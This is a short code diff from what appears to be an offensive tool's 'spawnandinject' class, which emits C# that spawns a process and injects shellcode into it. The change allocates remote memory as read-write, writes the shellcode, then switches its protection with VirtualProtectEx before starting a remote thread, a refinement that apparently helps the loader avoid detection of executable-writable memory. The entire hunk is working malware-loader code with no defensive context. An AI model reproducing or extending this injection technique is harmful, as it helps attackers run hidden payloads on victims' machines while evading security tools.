@@ -81,8 +81,10 @@ class spawnandinject:
 
             IntPtr bytesWritten;
             IntPtr threadId;
-            IntPtr pRemoteCode = {VirtualAllocEx}(pi.hProcess, IntPtr.Zero, {shellcodeSize}, 0x3000, $memoryPermission);
-            {WriteProcessMemory}(pi.hProcess, pRemoteCode, shellcode, {shellcodeSize}, out bytesWritten);
+            IntPtr pRemoteCode = {VirtualAllocEx}(pi.hProcess, IntPtr.Zero, {shellcodeSize}, 0x3000, 0x04);
+            {WriteProcessMemory}(pi.hProcess, pRemoteCode, shellcode, (ulong){shellcodeSize}, out bytesWritten);
+            IntPtr oldProtect;
+            {VirtualProtectEx}(pi.hProcess, pRemoteCode, (ulong){shellcodeSize}, $memoryPermission, out oldProtect);
             IntPtr hThread = {CreateRemoteThread}(pi.hProcess, IntPtr.Zero, 0, pRemoteCode, IntPtr.Zero, 0, out threadId);
             {WaitForSingleObject}(hThread, 500);
             {CloseHandle}(hThread);
